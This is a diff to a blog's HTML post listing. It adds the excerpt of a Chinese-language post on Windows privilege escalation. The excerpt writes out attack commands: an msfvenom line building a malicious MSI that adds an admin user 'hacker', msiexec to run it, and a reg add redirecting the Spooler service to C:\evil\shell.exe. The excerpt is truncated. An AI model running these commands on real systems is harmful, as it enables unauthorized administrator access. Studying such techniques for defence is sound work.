@@ -97,6 +97,32 @@
 
 <article class="post-entry"> 
   <header class="entry-header">
+    <h2 class="entry-hint-parent">Windows提权
+    </h2>
+  </header>
+  <div class="entry-content">
+    <p>Windows工作组环境和域环境提权方式详解 一、工作组环境提权方式 1. AlwaysInstallElevated提权 条件：
+系统已启用AlwaysInstallElevated（注册表值为1） 检查方法：
+reg query HKCU\SOFTWARE\Policies\Microsoft\Windows\Installer /v AlwaysInstallElevated reg query HKLM\SOFTWARE\Policies\Microsoft\Windows\Installer /v AlwaysInstallElevated 利用步骤：
+生成恶意MSI文件（在Kali Linux中）：
+msfvenom -p windows/adduser USER=hacker PASS=P@ssw0rd -f msi -o add.msi 如果在Windows上操作，可以使用在线工具生成MSI文件
+在Windows上执行：
+msiexec /i add.msi 验证提权：
+net user hacker 成功标志：看到hacker账户，且在管理员组中
+2. 服务权限配置错误提权 条件：
+服务路径权限配置错误 当前用户对服务可执行文件或目录有写权限 检查方法：
+sc query winpeas.exe quiet notcolor serviceinfo 利用步骤：
+找到一个服务（如Spooler）：
+sc qc Spooler 修改服务路径：
+reg add &#34;HKEY_LOCAL_MACHINE\SYSTEM\CurrentControlSet\Services\Spooler&#34; /t REG_EXPAND_SZ /v ImagePath /d &#34;C:\evil\shell.exe&#34; /f 重启服务：
+...</p>
+  </div>
+  <footer class="entry-footer"><span title='2026-02-15 00:00:00 +0000 UTC'>February 15, 2026</span>&nbsp;·&nbsp;<span>4 min</span>&nbsp;·&nbsp;<span>h4xk0r</span></footer>
+  <a class="entry-link" aria-label="post link to Windows提权" href="http://localhost:1313/posts/windows%E6%8F%90%E6%9D%83/"></a>
+</article>
+
+<article class="post-entry"> 
+  <header class="entry-header">
     <h2 class="entry-hint-parent">PHP反序列化
     </h2>
   </header>
